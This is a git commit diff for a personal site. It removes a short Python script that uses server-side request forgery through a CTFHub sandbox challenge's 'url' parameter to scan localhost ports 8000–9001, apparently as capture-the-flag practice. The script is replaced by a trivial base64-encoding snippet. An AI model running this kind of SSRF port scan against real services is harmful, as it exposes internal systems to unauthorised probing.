78f6e3a1f9bf2ccbc2c40ef7da5a4f8656e87bca
zhangsx19 <zhangsx19@mails.tsinghua.edu.cn>
2022-06-06 01:09:54 +0800

    Site updated: 2022-06-06 01:09:53

--- 私人/test.py
+++ 私人/test.py
@@ -1,13 +1,5 @@
-from time import time
-import requests
-ip = '127.0.0.1'
-for port in range(8000,9001):
-    url='http://challenge-3880abb86a91b3ac.sandbox.ctfhub.com:10800/?url=http://%s:%d'%(ip,port)
-    #print(url)
-    try:
-        res = requests.get(url,timeout=3)
-        print(res.content,port)
-        if len(res.content)>0:
-            print(ip,port,'is open')
-    except:
-        continue
+import base64
+
+
+score = 25
+print(base64.b64encode(str(score).encode('utf8')))
